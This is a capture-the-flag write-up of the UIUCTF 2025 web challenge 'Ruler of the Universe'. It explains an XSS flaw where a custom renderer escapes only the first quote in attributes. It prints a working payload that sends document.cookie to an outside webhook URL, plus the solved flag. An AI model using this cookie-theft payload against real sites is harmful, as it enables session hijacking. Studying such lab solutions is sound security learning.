---
title: UIUCTF 2025 - Ruler of the Universe
date: 2025-07-30
lastmod: 2025-07-30T13:00:30+02:00
categories:
  - writeup
  - uiuctf25
tags:
  - web
  - typescript
  - xss
authors:
  - Valenter
---
*With this ship I have the entire universe at my fingertips.*

Hi everyone, this is the first and easiest in a series of four sci-fi-inspired cosmic-web challenges from uiuctf. I only solved the first three, while my teammate simonedimaria worked on the fourth one, so I will only be tackling those.

First of all, let's take a second to appreciate the homepage of the challenge.
![Homepage](/uiuctf2025/ruler-of-the-universe/screenshot-1.png)

Straight out of last-century digital retrofuturism, System Shock or Neuromancer come to mind.

## Full diagnostic sweep of the mainframe

There's an *Admin Bot* link at the top, which points us in the direction of XSS.
![Admin-Bot](/uiuctf2025/ruler-of-the-universe/screenshot-2.png)

That's cool and all, but what can we actually interact with? Let's open those ominous Astra Main Frame modules at the bottom:
![Modules](/uiuctf2025/ruler-of-the-universe/screenshot-3.png)

Looks like we can leave a message for the crew, and it will appear under **Messages** at the bottom. Hmm, looks suspicious, let's pull up the ship's source code:

```ts
// module.tsx
const Module = ({
  id,
  crewMessage,
}: {
  id: number;
  crewMessage: string | null | undefined;
}) => {
  // ...
  <form class="mt-4" method="GET">
    <label for="message" class="block text-sm mb-1">
      Crew Message:
    </label>
    <input
      id="message"
      name="message"
      type="text"
      class="w-full border border-green-400 bg-black text-green-400 px-2 py-1 text-xs"
      placeholder={
        crewMessage
          ? `Update your message: ${crewMessage}`
          : "Enter a message for the crew"
      }
    />
  </form>
  // ...
};
:contentReference[oaicite:2]{index=2}
```

`crewMessage` is taken directly from `index.tsx`'s `const crewMessage = new URL(req.url).searchParams.get("message");` and interpolated into the *placeholder*.
Diving deeper into how all of this gets rendered onto the page:

```ts
import { escapeHTML } from "bun";

export function render(element: any): string {
  if (typeof element === "string" || typeof element === "number") {
    return escapeHTML(element);
  }
//...
  const propString = props
    ? Object.entries(props)
        .filter(([key]) => key !== "children")
        .map(([key, value]) => {
          if (typeof value === "boolean") {
            return value ? key : "";
          }
          // Here is where double quotes are improperly escaped
          return `${key}="${String(value).replace('"', "&quot;")}"`;
        })
        .filter(Boolean)
        .join(" ")
    : "";

  const openTag = propString ? `<${type} ${propString}>` : `<${type}>`;
  return `${openTag}${children}</${type}>`;
}
```

The render function employs Bun's `escapeHTML`,  which makes the following replacements:
- `"` becomes `"&quot;"`
- `&` becomes `"&amp;"`
- `'` becomes `"&#x27;"`
- `<` becomes `"&lt;"`
- `>` becomes `"&gt;"`

however, it only does so for strings and numbers; for attributes, a much weaker substitution is in place:

```ts
return `${key}="${String(value).replace('"', "&quot;")}"`;
```
but `replace` only takes care of the first instance of the character in a string.

## Initiating the breach protocol

Knowing all this, and with a bit of trial and error, we can craft a working payload:

```js
crewMessage = img"" /><img src=x onerror="alert(1)" x="
```

During serialization:
- the first `"` in `img""` becomes `&quot;`
- the second `"` closes the `img` attribute

the final markup becomes:

```js
<input … placeholder="Update your message: img&quot;"
/>
<img src=x onerror="alert(1)" x=>
```

Now it's only a matter of adapting it to our purposes:

```js
img"" /><img src=x onerror="fetch(\'%s?c=\'+encodeURIComponent(document.cookie))" x="
```

Finally, we encode it into the full URL and send a POST request with the link to the Admin Bot to visit the page and retrieve the flag, which is in the bot's cookies, by forwarding it to our webhook:

```
https://inst-8be5f028661a5917-ruler-of-the-universe.chal.uiuc.tf/module/0?message=img%22%22%20%2F%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch%28%27https%3A%2F%2Fwebhook.site%2F66ce23cb-d0e5-4bf5-9016-58351c7f0d51%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%29%22%20x%3D%22
```

**`uiuctf{maybe_i_should_just_use_react_c49b79}`**
